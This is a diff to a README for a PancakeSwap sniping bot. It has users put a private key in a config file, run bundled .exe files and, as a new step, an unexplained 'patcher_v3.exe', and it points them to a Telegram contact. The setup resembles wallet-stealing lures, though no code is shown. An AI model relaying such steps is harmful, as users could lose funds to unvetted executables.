@@ -32,9 +32,9 @@ my_pk = ''</pre>
 3. Run "Sniping bot 21-5 Final-1152-utc.exe"
 
 - Make sure configfile.py and bot.exe are in the same folder.
+- If error occurs, you can run the bot by starting "patcher_v3.exe" and closing the command line after the bot launches
 
-
-5. Edit settings according to choice.
+4. Edit settings according to choice.
 
 
 <br> </br>
@@ -49,7 +49,7 @@ my_pk = ''</pre>
 
 <b>Pcs version</b>: Which version of Pancakeswap you want to snipe on <b>(this setting can only be edited from the configfile.py)</b>
 
-<h2>For whitelist, https://t.me/evosnipes (Telegram) </h2>
+<h2>For help, contact me at https://t.me/evosnipes (Telegram) </h2>
 
 ....
 
